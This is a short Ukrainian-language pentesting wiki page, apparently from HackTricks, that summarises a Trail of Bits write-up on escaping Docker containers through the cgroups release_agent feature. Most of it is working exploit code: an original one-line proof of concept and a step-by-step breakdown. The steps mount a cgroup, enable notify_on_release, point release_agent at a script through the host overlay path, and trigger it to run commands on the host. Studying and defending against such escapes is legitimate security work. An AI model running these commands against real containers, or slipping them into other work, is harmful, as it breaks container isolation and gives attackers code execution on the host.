# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Для отримання додаткової інформації зверніться до** [**оригінального блогу**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Це лише резюме:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Доказ концепції (PoC) демонструє метод експлуатації cgroups шляхом створення файлу `release_agent` і виклику його для виконання довільних команд на хості контейнера. Ось розбивка кроків, що входять до процесу:

1. **Підготовка середовища:**
- Створюється директорія `/tmp/cgrp`, яка слугує точкою монтування для cgroup.
- Контролер cgroup RDMA монтується в цю директорію. У разі відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Налаштуйте дочірній cgroup:**
- Дочірній cgroup з назвою "x" створюється в змонтованій директорії cgroup.
- Сповіщення увімкнені для cgroup "x" шляхом запису 1 у його файл notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Налаштуйте Release Agent:**
- Шлях контейнера на хості отримується з файлу /etc/mtab.
- Файл release_agent cgroup потім налаштовується для виконання скрипту з назвою /cmd, розташованого за отриманим шляхом хоста.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Створіть і налаштуйте скрипт /cmd:**
- Скрипт /cmd створюється всередині контейнера і налаштовується для виконання ps aux, перенаправляючи вихідні дані у файл з назвою /output в контейнері. Повний шлях до /output на хості вказується.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Запустіть атаку:**
- Процес ініціюється в "x" дочірньому cgroup і відразу ж завершується.
- Це викликає `release_agent` (скрипт /cmd), який виконує ps aux на хості та записує вихідні дані в /output всередині контейнера.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
